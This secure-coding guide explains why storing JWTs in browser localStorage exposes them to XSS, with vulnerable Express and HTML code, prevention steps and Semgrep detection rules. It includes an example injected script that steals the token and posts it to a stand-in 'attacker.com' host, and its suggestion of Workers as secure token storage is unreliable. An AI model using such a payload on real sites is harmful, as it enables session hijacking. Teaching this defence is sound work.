# Insecure Client-Side Storage of JWTs

### Concept

JSON Web Tokens (JWTs) are commonly used for authentication and authorization in web applications. After a user successfully authenticates, the server issues a JWT that contains encoded user information and is digitally signed. The client-side application then stores this JWT and includes it in subsequent requests to authenticate and access protected resources.

However, if the JWT is stored insecurely on the client-side, such as in local storage or session storage, it becomes vulnerable to cross-site scripting (XSS) attacks. An attacker who successfully injects malicious JavaScript code into the application can access and steal the stored JWT, allowing them to impersonate the user and perform unauthorized actions.

### Vulnerable Scenario

Consider a web application that uses JWTs for authentication. After a user logs in, the server issues a JWT, which is then stored in the browser's local storage on the client-side. The application retrieves the JWT from local storage and includes it in the `Authorization` header of subsequent requests to access protected resources.

#### Example Code (Vulnerable)

```javascript
// Backend code (Express.js)
const express = require('express');
const jwt = require('jsonwebtoken');

const app = express();
app.use(express.json());

const secretKey = 'your-secret-key';

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Authenticate the user (code not shown)
  if (authenticateUser(username, password)) {
    const token = jwt.sign({ username }, secretKey);
    res.json({ token });
  } else {
    res.status(401).json({ message: 'Invalid credentials' });
  }
});

// Frontend code (HTML and JavaScript)
<!DOCTYPE html>
<html>
<head>
  <title>Welcome User</title>
  <script>
    // Get the JWT token from local storage
    const token = localStorage.getItem('token');

    // Use the token to make authenticated requests
    fetch('/api/protected', {
      headers: {
        'Authorization': `Bearer ${token}`
      }
    })
    .then(response => response.json())
    .then(data => {
      document.getElementById('welcome').textContent = data.message;
    });
  </script>
</head>
<body>
  <h1 id="welcome"></h1>
</body>
</html>
```

### Explanation

In this vulnerable scenario, the web application stores the JWT in the browser's local storage after a successful login. The token is then retrieved from local storage and used to make authenticated requests to the server.

However, storing JWTs in local storage poses a security risk because it is vulnerable to cross-site scripting (XSS) attacks. If an attacker manages to inject malicious JavaScript code into the application, they can access and steal the JWT token from local storage.

Here's an example of how an XSS attack can exploit the insecure storage of JWTs:

1. The attacker discovers an XSS vulnerability in the application that allows them to inject malicious JavaScript code.
2.  The attacker crafts a malicious script that retrieves the JWT token from local storage and sends it to their own server:

    ```javascript
    <script>
      const token = localStorage.getItem('token');
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({ token })
      });
    </script>
    ```
3. The attacker injects this malicious script into a vulnerable page or input field of the application.
4. When a user visits the compromised page or interacts with the vulnerable component, the malicious script is executed in the user's browser.
5. The script retrieves the JWT token from local storage and sends it to the attacker's server.
6. The attacker can now use the stolen JWT token to impersonate the user and make unauthorized requests to the server.

### Prevention

To mitigate the risks associated with insecure client-side storage of JWTs and prevent XSS attacks, consider the following measures:

1.  Use HTTP-only cookies: Instead of storing JWTs in local storage or session storage, store them in HTTP-only cookies. HTTP-only cookies are not accessible to JavaScript, making them more secure against XSS attacks.

    ```javascript
    // Backend code (Express.js)
    app.post('/login', (req, res) => {
      // ...
      res.cookie('token', token, { httpOnly: true, secure: true });
      // ...
    });
    ```
2. Implement proper XSS prevention measures:
   * Validate and sanitize user input to prevent the injection of malicious scripts.
   * Encode user-generated content before rendering it on the page.
   * Use a Content Security Policy (CSP) to restrict the sources of scripts and other resources.
3. Use secure flags for cookies: When storing JWTs in cookies, set the `secure` flag to ensure the cookie is only transmitted over HTTPS, and set the `sameSite` attribute to `strict` or `lax` to prevent cross-site request forgery (CSRF) attacks.
4. Implement token expiration and rotation: Set appropriate expiration times for JWTs and implement token rotation mechanisms to limit the window of opportunity for attackers to use stolen tokens.
5. Use secure storage mechanisms: If storing JWTs on the client-side is necessary, consider using more secure storage mechanisms like Web Workers or Service Workers, which run in a separate context and are less vulnerable to XSS attacks.

### Conclusion

Insecure client-side storage of JWTs, such as storing them in local storage or session storage, makes the application vulnerable to cross-site scripting (XSS) attacks. Attackers can exploit XSS vulnerabilities to steal JWTs and gain unauthorized access to the application.

To prevent these vulnerabilities, it is recommended to store JWTs in HTTP-only cookies, implement proper XSS prevention measures, use secure flags for cookies, implement token expiration and rotation, and consider using secure storage mechanisms.

Developers should be aware of the risks associated with client-side storage of JWTs and take appropriate measures to protect against XSS attacks and ensure the security of their applications.

#### **Semgrep Rules**

Here are a couple of Semgrep rules that can help identify insecure storage of JWTs in local storage or session storage:

1. Detecting JWTs stored in local storage:

```yaml
rules:
  - id: jwt-in-local-storage
    patterns:
      - pattern: localStorage.setItem("token", $JWT)
    message: "Insecure storage of JWT in local storage. Use HTTP-only cookies or secure storage mechanisms instead."
    languages:
      - javascript
    severity: ERROR
```

2. Detecting JWTs stored in session storage:

```yaml
rules:
  - id: jwt-in-session-storage
    patterns:
      - pattern: sessionStorage.setItem("token", $JWT)
    message: "Insecure storage of JWT in session storage. Use HTTP-only cookies or secure storage mechanisms instead."
    languages:
      - javascript
    severity: ERROR
```

These Semgrep rules identify instances where JWTs are stored in local storage or session storage using the `setItem` method. They suggest using HTTP-only cookies or secure storage mechanisms instead to prevent XSS attacks.

Note that these rules are a starting point and may need to be adapted based on your specific application and coding patterns. It is important to thoroughly review and test the security of your JWT implementation and client-side storage mechanisms to ensure the protection against XSS attacks and other vulnerabilities.
